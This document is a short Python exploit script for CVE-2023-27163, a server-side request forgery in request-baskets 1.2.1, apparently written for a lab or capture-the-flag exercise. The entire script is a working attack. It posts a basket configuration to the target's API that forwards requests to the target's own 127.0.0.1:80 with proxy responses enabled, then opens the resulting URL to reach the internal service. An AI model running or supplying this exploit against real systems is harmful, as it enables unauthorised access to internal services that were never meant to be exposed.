#!/bin/python3

# SSRF in request-baskets 1.2.1
# With the help of https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53

import sys, requests, webbrowser

# Checks for arguments.
if len(sys.argv) < 2:
    print("[-] Arguments required!")
    print("[!] Command: python3 ./exploit http://<TARGET>:55555")
    exit()

# Global variables
TARGET = sys.argv[1]

# CVE-2023-27163 - Forwards at 127.0.0.1:80
def requestBaskets():
    url=TARGET + '/api/baskets/temp'
    
    headers={'Content-Type': 'application/json'}

    data = {
        'forward_url': 'http://127.0.0.1:80/',
        'proxy_response': True,
        'insecure': False,
        'expand_path': True,
        'capacity': 250
    }

    r = requests.post(url, headers=headers, json=data)
    url2 = TARGET + '/temp'
    webbrowser.open(url2)

# Main
if __name__ == "__main__":
    requestBaskets()
